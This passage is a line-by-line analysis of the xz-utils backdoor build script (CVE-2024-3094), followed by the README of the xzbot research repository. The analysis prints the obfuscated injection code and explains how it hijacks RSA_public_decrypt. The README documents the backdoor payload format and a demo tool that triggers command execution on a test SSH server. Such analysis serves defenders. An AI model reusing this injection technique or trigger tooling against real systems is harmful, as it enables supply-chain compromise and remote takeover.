if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi

```

Check that `liblzma/Makefile` contains all the lines that will be used as anchor points later for inserting new text into the Makefile.
```
if ! grep -qs "$O" libtool > /dev/null 2>&1;then
exit 0
fi

```

`$O` was set at the very start of the script. This is checking that the libtool file, presumably generated during the build process, configures the compiler for a PIC (position independent code) build.
```
eval $zrKcTy
b="am__test = $U"

```

`$U` was also set at the start of the script: `U="bad-3-corrupt_lzma2.xz"`. Real work is starting!
```
sed -i "/$j/i$b" src/liblzma/Makefile || true

```

`sed -i` runs an in-place modification of the input file, in this case `liblzma/Makefile`. Specifically, find the `ACLOCAL_M4` line we grepped for earlier (`/$j/`) and insert the `am__test` setting from `$b` (`i$b`).
```
d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
b="am__strip_prefix = $d"
sed -i "/$w/i$b" src/liblzma/Makefile || true

```

Shell quoting inside a quoted string inside a Makefile really is something special. This is escaping the backslashes in the tr command enough times that it will work to insert them into the Makefile after the `am__install_max` line (`$w`).
```
b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
sed -i "/$E/i$b" src/liblzma/Makefile || true
b="\$(top_srcdir)/tests/files/\$(am__test)"
s="am__test_dir=$b"
sed -i "/$Q/i$s" src/liblzma/Makefile || true

```

More added lines. It’s worth stopping for a moment to look at what’s happened so far. The script has added these lines to `src/liblzma/Makefile`:
```
am__test = bad-3-corrupt_lzma2.xz
am__strip_prefix = tr "\\t \\-_" " \\t_\\-"
am__dist_setup = $(am_strip_prefix) | xz -d 2>/dev/null | $(SHELL)
am__test_dir = $(top_srcdir)/tests/files/$(am__test)

```

These look plausible but fall apart under closer examination: for example, `am__test_dir` is a file, not a directory. The goal here seems to be that after `configure` has run, the generated `Makefile` still looks plausibly inscrutable. And the lines have been added in scattered places throughout the `Makefile`; no one will see them all next to each other like in this display. Back to the script:
```
h="-Wl,--sort-section=name,-X"
if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
h=$h",-z,now"
fi
j="liblzma_la_LDFLAGS += $h"
sed -i "/$L/i$j" src/liblzma/Makefile || true

```

Add `liblzma_la_LDFLAGS += -Wl,--sort-section=name,-X` to the Makefile. If the `LDFLAGS` do not already say `-z,now` or `-Wl,now`, add `-z,now`.

The “`-Wl,now`” forces `LD_BIND_NOW` behavior, in which the dynamic loader resolves all symbols at program startup time. One reason this is normally done is for security: it makes sure that the global offset table and procedure linkage tables can be marked read-only early in process startup, so that buffer overflows or write-after-free bugs cannot target those tables. However, it also has the effect of running GNU indirect function (ifunc) resolvers at startup during that resolution process, and the backdoor arranges to be called from one of those. This early invocation of the backdoor setup lets it run while the tables are still writable, allowing the backdoor to replace the entry for `RSA_public_decrypt` with its own version. But we are getting ahead of ourselves. Back to the script:
```
sed -i "s/$O/$C/g" libtool || true

```

We checked earlier that the libtool file said `pic_flag=" -fPIC -DPIC"`. The sed command changes it to read `pic_flag=" -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"`.

It is not clear why these additional flags are important, but in general they disable linker optimizations that could plausibly get in the way of subterfuge.
```
k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
sed -i "s/$u/$k/" src/liblzma/Makefile || true
l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
    export top_srcdir='\$(top_srcdir)'; \\\\\n\
    export CC='\$(CC)'; \\\\\n\
    export DEFS='\$(DEFS)'; \\\\\n\
    export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
    export INCLUDES='\$(INCLUDES)'; \\\\\n\
    export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
    export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
    export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
    export CFLAGS='\$(CFLAGS)'; \\\\\n\
    export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
    export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
    export libdir='\$(libdir)'; \\\\\n\
    export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
    export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
sed -i "/$m/i$l" src/liblzma/Makefile || true
eval $zrKcHD

```

Shell quoting continues to be trippy, but we’ve reached the final change. This adds the line
```
AM_V_CCLD = @echo -n $(LTDEPS); $(am__v_CCLD_$(V))

```

to one place in the Makefile, and then adds a long script that sets up some variables, entirely as misdirection, that ends with
```
sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1

```

The `sed rpath` command is just as much an obfuscated `cat` as `sed "r\n"` was, but `-rpath` is a very common linker flag, so at first glance you might not notice it’s next to the wrong command. Recalling the `am__test` and related lines added above, this pipeline ends up being equivalent to:
```
cat ./tests/files/bad-3-corrupt_lzma2.xz |
tr "\t \-_" " \t_\-" |
xz -d |
/bin/sh

```

Our old friend! We know what this does, though. It runs the very script we are currently reading in this post. [How recursive!](https://research.swtch.com/zip)
[## Make](#make)

Instead of running during `configure` in the tarball root directory, let’s mentally re-execute the script as it would run during `make` in the `liblzma` directory. In that context, the variables at the top have been set, but all the editing we just considered was skipped over by “if #1” not finding `./config.status`. Now let’s keep executing the script.
```
fi

```

That `fi` closes “if #2”, which checked for a Debian or RPM build. The upcoming `elif` continues “if #1”, which checked for config.status, meaning now we are executing the part of the script that matters when run during `make` in the `liblzma` directory:
```
elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then

```

If we see the built objects for the crc code, we are running as part of `make`. Run the following code.
```
# Entirely new in 5.6.1
vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
if test "x$vs" != "x" > /dev/null 2>&1;then
f1=`echo $vs | cut -d: -f1`
if test "x$f1" != "x" > /dev/null 2>&1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null`
if test "x$ve" != "x" > /dev/null 2>&1;then
f2=`echo $ve | cut -d: -f1`
if test "x$f2" != "x" > /dev/null 2>&1;then
[ ! "x$f2" = "x$f1" ] && exit 0
[ ! -f $f1 ] && exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} |
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
    xz -F raw --lzma2 -dc`
fi
fi
fi
fi

```

We start this section with another extension hook. This time the magic strings are `'jV!.^%'` and `'%.R.1Z'`. As before, there are no test files with these strings. This was for future extensibility.

On to the code shared with 5.6.0:
```
eval $zrKcKQ
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
exit 0
fi
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
exit 0
fi
if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi
if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi

```

Check that the ifunc-enabled CRC source files look right. Interestingly, Lasse Collin renamed `crc_clmul.c` to `crc_x86_clmul.h` [on 2024-01-11](https://git.tukaani.org/?p=xz.git;a=commit;h=419f55f9dfc2df8792902b8953d50690121afeea). One has to assume that the person or team behind “Jia Tan” had been working on all this code well before then and that the first version checked `crc_clmul.c`. They were probably very annoyed when Lasse Collin accidentally broke their in-development backdoor by cleaning up the file names!
```
if ! grep -qs "$C" ../../libtool; then
exit 0
fi
if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
exit 0
fi

```

Check that the build configuration has the extra flags we added before.
```
if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
exit 0
fi

```

Check that no one has added `lazy` to the linker options, which might override the `-Wl,now`. (This code really needs to run before the tables it patches get marked read-only!)
```
N=0
W=0
Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
eval $zrKcjv
if test -z "$Y"; then
N=0
W=88664
else
N=88664
W=0
fi

```

This is selecting between two different offset values depending on the content of `gettext.m4`. The distributed xz tarballs do not contain that string in `gettext.m4` (it does appear in `build-to-host.m4`), so the `grep` finds nothing, `$Y` is the empty string, and the true case of the `if` executes: `N=0` and `W=88792`.
```
xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" |

```

I inserted a line break here. Remember the “corrupt” test file script set `i` to the large head pipeline? It’s still set here, being used inside the script extracted from that pipeline. Before, the pipeline extracted 33,707 bytes and then we used the final 31,233 bytes. Now we are using the entire thing, which probably means just the prefix that we skipped before. The sed command is inserting a newline after every byte of that output, setting up for piping into the remainder of the command line:
```
LC_ALL=C awk '
BEGIN{
    FS="\n";RS="\n";ORS="";m=256;
    for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}
    i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}
}
{
    v=t["x" (NF<1?RS:$1)];
    i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];
    printf "%c",(v+k)%m
}' |

```

I inserted another line break here. What is this? [@nugxperience on Twitter recognized it](https://twitter.com/nugxperience/status/1773906926503591970) as an RC4-like decryption function, implemented in awk! Apparently the `tr`-based substitution cipher wasn’t secure enough for this step. This is the 5.6.1 version; the 5.6.0 version is the same except that the second loop counts to 4096 instead of 8192.

Back to the script:
```
xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true

```

We finally made it to the end of this long line. The decrypted output is piped through xz to decompress it; the `--single-stream` flag says to stop at the end of the first xz EOF marker instead of looking for additional files on standard input. This avoids reading the section of the input that we extracted with the `tail` command before. Then the decompressed data is piped through a `head` pair that extracts either the full 88,792 byte input or zero bytes, depending on `gettext.m4` from before, and writes it to `liblzma_la-crc64-fast.o`. In our build, we are taking the full input.
```
if ! test -f liblzma_la-crc64-fast.o; then
exit 0
fi

```

If all that failed, stop quietly.
```
cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true

```

Wait what? Oh! Notice the two different file names `crc64_fast` versus `crc64-fast`. And neither of these is the one we just extracted. These are in `.libs/`, and the one we extracted is in the current directory. This is backing up the real file (the underscored one) into a file with a very similar name (the hyphenated one).
```
V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) &&
    defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) &&
    (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\n
    extern int _get_cpuid(int, void*, void*, void*, void*, void*);\n
    static inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4];
    success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16);
    const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19);
    return success && (r[2] & ecx_mask) == ecx_mask; }\n
    #else\n
    #define _is_arch_extension_supported is_arch_extension_supported'

```

This string `$V` begins with “`#endif`”, which is never a good sign. Let’s move on for now, but we’ll take a closer look at that text shortly.
```
eval $yosA
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS \
    $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then

```

This `if` statement is running a pipeline of sed commands piped into `$CC` with the arguments `liblzma_la-crc64-fast.o` (adding that object as an input to the compiler) and `-x` `c` `-` (compile a C program from standard input). That is, it rebuilds an edited copy of `crc64_fast.c` (a real xz source file) and merges the extracted malicious `.o` file into the resulting object, overwriting the underscored real object file that would have been built originally for `crc64_fast.c`. The `sed` `1i` tells the compiler the file name to record in debug info, since the compiler is reading standard input—very tidy! But what are the edits?

The file starts out looking like:
```
...
#if defined(CRC_X86_CLMUL)
#   define BUILDING_CRC64_CLMUL
#   include "crc_x86_clmul.h"
#endif
...
static crc64_func_type
crc64_resolve(void)
{
    return is_arch_extension_supported()
            ? &crc64_arch_optimized : &crc64_generic;
}

```

The sed commands add an `_` prefix to the name of the function in the return condition, and then add `$V` after the `include` line, producing (with reformatting of the C code):
```
# 0 "path/to/src/liblzma/check/crc64_fast.c"
...
#if defined(CRC_X86_CLMUL)
#   define BUILDING_CRC64_CLMUL
#   include "crc_x86_clmul.h"
#endif

#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && \
    defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && \
    (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))

extern int _get_cpuid(int, void*, void*, void*, void*, void*);

static inline bool _is_arch_extension_supported(void) {
    int success = 1;
    uint32_t r[4];
    success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16);
    const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19);
    return success && (r[2] & ecx_mask) == ecx_mask;
}

#else
#define _is_arch_extension_supported is_arch_extension_supported
#endif
...
static crc64_func_type
crc64_resolve(void)
{
    return _is_arch_extension_supported()
            ? &crc64_arch_optimized : &crc64_generic;
}

```

That is, the crc64\_resolve function, which is the ifunc resolver that gets run early in dynamic loading, before the GOT and PLT have been marked read-only, is now calling the newly inserted `_is_arch_extension_supported`, which calls `_get_cpuid`. This still looks like plausible code, since this is pretty similar to [the real is\_arch\_extension\_supported](https://git.tukaani.org/?p=xz.git;a=blob;f=src/liblzma/check/crc_x86_clmul.h;h=ae66ca9f8c710fd84cd8b0e6e52e7bbfb7df8c0f;hb=2d7d862e3ffa8cec4fd3fdffcd84e984a17aa429#l388). But `_get_cpuid` is provided by the backdoor .o, and it does a lot more before returning the cpuid information. In particular it rewrites the GOT and PLT to hijack calls to RSA\_public\_decrypt.

But let’s get back to the shell script, which is still running from inside `src/liblzma/Makefile` and just successfully inserted the backdoor into `.libs/liblzma_la-crc64_fast.o`. We are now in the `if` compiler success case:
```
cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
eval $BPep
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
sed "/include \"crc32_arm64.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS \
    $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then

```

This does the same thing for `crc32_fast.c`, except it doesn’t add the backdoored object code. We don’t want two copies of that in the build. It is unclear why the script bothers to intercept both the crc32 and crc64 ifuncs; either one should have sufficed. Perhaps they wanted the dispatch code for both to look similar in a debugger. Now we’re in the doubly nested `if` compiler success case:
```
eval $RgYB
if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then

```

If we can relink the .la file, then...
```
if test ! -f .libs/liblzma.so; then
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi

```

If the relink succeeded but didn’t write the file, assume it failed and restore the backups.
```
rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true

```

No matter what, remove the libraries. (The `Makefile` link step is presumably going to happen next and recreate them.)
```
else
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi

```

This is the `else` for the link failing. Restore from backups.
```
rm -f .libs/liblzma_la-crc32-fast.o || true
rm -f .libs/liblzma_la-crc64-fast.o || true

```

Now we are in the inner compiler success case. Delete backups.
```
else
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi

```

This is the else for the crc32 compilation failing. Restore from backups.
```
else
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi

```

This is the else for the crc64 compilation failing. Restore from backup. (This is not the cleanest shell script in the world!)
```
rm -f liblzma_la-crc64-fast.o || true

```

Now we are at the end of the Makefile section of the script. Delete the backup.
```
fi
eval $DHLd
$

```

Close the “`elif` we’re in a Makefile”, one more extension point/debug print, and we’re done!
The script has injected the object file into the objects built during `make`, leaving no trace behind.



=== Content from github.com_a001a192_20250111_034016.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Famlweems%2Fxzbot)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Famlweems%2Fxzbot)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=amlweems%2Fxzbot)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[amlweems](/amlweems)
/
**[xzbot](/amlweems/xzbot)**
Public

* [Notifications](/login?return_to=%2Famlweems%2Fxzbot) You must be signed in to change notification settings
* [Fork
  240](/login?return_to=%2Famlweems%2Fxzbot)
* [Star
   3.5k](/login?return_to=%2Famlweems%2Fxzbot)

notes, honeypot, and exploit demo for the xz backdoor (CVE-2024-3094)

[3.5k
stars](/amlweems/xzbot/stargazers) [240
forks](/amlweems/xzbot/forks) [Branches](/amlweems/xzbot/branches) [Tags](/amlweems/xzbot/tags) [Activity](/amlweems/xzbot/activity)
 [Star](/login?return_to=%2Famlweems%2Fxzbot)

 [Notifications](/login?return_to=%2Famlweems%2Fxzbot) You must be signed in to change notification settings

* [Code](/amlweems/xzbot)
* [Pull requests
  0](/amlweems/xzbot/pulls)
* [Actions](/amlweems/xzbot/actions)
* [Security](/amlweems/xzbot/security)
* [Insights](/amlweems/xzbot/pulse)

Additional navigation options

* [Code](/amlweems/xzbot)
* [Pull requests](/amlweems/xzbot/pulls)
* [Actions](/amlweems/xzbot/actions)
* [Security](/amlweems/xzbot/security)
* [Insights](/amlweems/xzbot/pulse)

# amlweems/xzbot

    main[Branches](/amlweems/xzbot/branches)[Tags](/amlweems/xzbot/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[6 Commits](/amlweems/xzbot/commits/main/) | | |
| [assets](/amlweems/xzbot/tree/main/assets "assets") | | [assets](/amlweems/xzbot/tree/main/assets "assets") |  |  |
| [README.md](/amlweems/xzbot/blob/main/README.md "README.md") | | [README.md](/amlweems/xzbot/blob/main/README.md "README.md") |  |  |
| [go.mod](/amlweems/xzbot/blob/main/go.mod "go.mod") | | [go.mod](/amlweems/xzbot/blob/main/go.mod "go.mod") |  |  |
| [go.sum](/amlweems/xzbot/blob/main/go.sum "go.sum") | | [go.sum](/amlweems/xzbot/blob/main/go.sum "go.sum") |  |  |
| [main.go](/amlweems/xzbot/blob/main/main.go "main.go") | | [main.go](/amlweems/xzbot/blob/main/main.go "main.go") |  |  |
| [openssh.patch](/amlweems/xzbot/blob/main/openssh.patch "openssh.patch") | | [openssh.patch](/amlweems/xzbot/blob/main/openssh.patch "openssh.patch") |  |  |
| [patch.py](/amlweems/xzbot/blob/main/patch.py "patch.py") | | [patch.py](/amlweems/xzbot/blob/main/patch.py "patch.py") |  |  |
| View all files | | |

## Repository files navigation

* README
# xzbot

Exploration of the xz [backdoor](https://www.openwall.com/lists/oss-security/2024/03/29/4) (CVE-2024-3094).
Includes the following:

* [honeypot](#honeypot): fake vulnerable server to detect exploit attempts
* [ed448 patch](#ed448-patch): patch liblzma.so to use our own ED448 public key
* [backdoor format](#backdoor-format): format of the backdoor payload
* [backdoor demo](#backdoor-demo): cli to trigger the RCE assuming knowledge of the ED448 private key

[![xzbot demo](/amlweems/xzbot/raw/main/assets/demo.png)](/amlweems/xzbot/blob/main/assets/demo.png)

## honeypot

See [openssh.patch](/amlweems/xzbot/blob/main/openssh.patch) for a simple patch to openssh that logs any
connection attempt with a public key N matching the backdoor format.

```
$ git clone https://github.com/openssh/openssh-portable
$ patch -p1 < ~/path/to/openssh.patch
$ autoreconf
$ ./configure
$ make

```

Any connection attempt will appear as follows in sshd logs:

```
$ journalctl -u ssh-xzbot --since='1d ago' | grep xzbot:
Mar 30 00:00:00 honeypot sshd-xzbot[1234]: xzbot: magic 1 [preauth]
Mar 30 00:00:00 honeypot sshd-xzbot[1234]: xzbot: 010000000100000000000000000000005725B22ED2...

```

# ed448 patch

The backdoor uses a hardcoded ED448 public key for signature validation and
decrypting the payload. If we replace this key with our own, we can trigger
the backdoor.

The attacker's ED448 key is:

```
0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28
34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48
10 0c b0 6c 3a be 14 ee 89 55 d2 45 00 c7 7f 6e
20 d3 2c 60 2b 2c 6d 31 00

```

We will replace this key with our own (generated with seed=0):

```
5b 3a fe 03 87 8a 49 b2 82 32 d4 f1 a4 42 ae bd
e1 09 f8 07 ac ef 7d fd 9a 7f 65 b9 62 fe 52 d6
54 73 12 ca ce cf f0 43 37 50 8f 9d 25 29 a8 f1
66 91 69 b2 1c 32 c4 80 00

```

To start, download a backdoored libxzma shared object, e.g.
from <https://snapshot.debian.org/package/xz-utils/5.6.1-1>.
Then run the patch script. See [assets/](/amlweems/xzbot/blob/main/assets) for examples.

```
$ pip install pwntools
$ shasum -a 256 liblzma.so.5.6.1
605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4  liblzma.so.5.6.1
$ python3 patch.py liblzma.so.5.6.1
Patching func at offset: 0x24470
Generated patched so: liblzma.so.5.6.1.patch

```

Then run sshd using this modified `liblzma.so.5.6.1.patch` shared object.

## backdoor format

The backdoor can be triggered by connecting with an SSH certificate with a
payload in the CA signing key N value. This payload must be encrypted and
signed with the attacker's ED448 key.

The structure has the following format:

```
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|   a (32 bit)  |   b (32 bit)  |           c (64 bit)          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
+                     ciphertext (240 bytes)                    +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

```

A request type is derived from the three values above (`a * b + c`).
If this value is greater than 3, the backdoor skips processing.

* Type 1: unknown, expects zero bytes
* Type 2: executes null-terminated payload with system()
* Type 3: unknown, expects 48 bytes (signed)

The ciphertext is encrypted with chacha20 using the first 32 bytes of the
ED448 public key as a symmetric key. As a result, we can decrypt any
exploit attempt using the following key:

```
0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28
34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48

```

The ciphertext has the following format:

```
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    signature (114 bytes)                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| x (1 bit) |            unused ? (14 bit)          | y (1 bit) |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|        unknown (8 bit)        |         length (8 bit)        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|        unknown (8 bit)        |         command \x00          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

```

Setting either `x` or `y` leads to slightly different code paths.

The signature is an RFC-8032 ED448 signature computed over the following values:

* The 32-bit magic value (e.g. `02 00 00 00`)
* The 5 bytes of fields before command
* [optional] `length` bytes of the command
* The first 32 bytes of the sha256 hash of the server's hostkey

# backdoor demo

```
$ go install github.com/amlweems/xzbot@latest

```

```
$ xzbot -h
Usage of xzbot:
  -addr string
        ssh server address (default "127.0.0.1:2222")
  -seed string
        ed448 seed, must match xz backdoor key (default "0")
  -cmd string
        command to run via system() (default "id > /tmp/.xz")

```

The following will connect to a vulnerable SSH server at `127.0.0.1:2222` and
run the command `id > /tmp/.xz`:

```
$ xzbot -addr 127.0.0.1:2222 -cmd 'id > /tmp/.xz'
00000000  00 00 00 1c 73 73 68 2d  72 73 61 2d 63 65 72 74  |....ssh-rsa-cert|
00000010  2d 76 30 31 40 6f 70 65  6e 73 73 68 2e 63 6f 6d  |-v01@openssh.com|
00000020  00 00 00 00 00 00 00 03  01 00 01 00 00 01 01 01  |................|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
...
00000150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000160  00 00 01 14 00 00 00 07  73 73 68 2d 72 73 61 00  |........ssh-rsa.|
00000170  00 00 01 01 00 00 01 00  02 00 00 00 01 00 00 00  |................|
00000180  00 00 00 00 00 00 00 00  54 97 bc c5 ef 93 e4 24  |........T......$|
00000190  cf b1 57 57 59 85 52 fd  41 2a a5 54 9e aa c6 52  |..WWY.R.A*.T...R|
000001a0  58 64 a4 17 45 8a af 76  ce d2 e3 0b 7c bb 1f 29  |Xd..E..v....|..)|
000001b0  2b f0 38 45 3f 5e 00 f1  b0 00 15 84 e7 bc 10 1f  |+.8E?^..........|
000001c0  0f 5f 50 36 07 9f bd 07  05 77 5c 74 84 69 c9 7a  |._P6.....w\t.i.z|
000001d0  28 6b e8 16 aa 99 34 bf  9d c4 c4 5c b8 fd 4a 3c  |(k....4....\..J<|
000001e0  d8 2b 39 32 06 d9 4f a4  3a 00 d0 0b 0f a2 21 c0  |.+92..O.:.....!.|
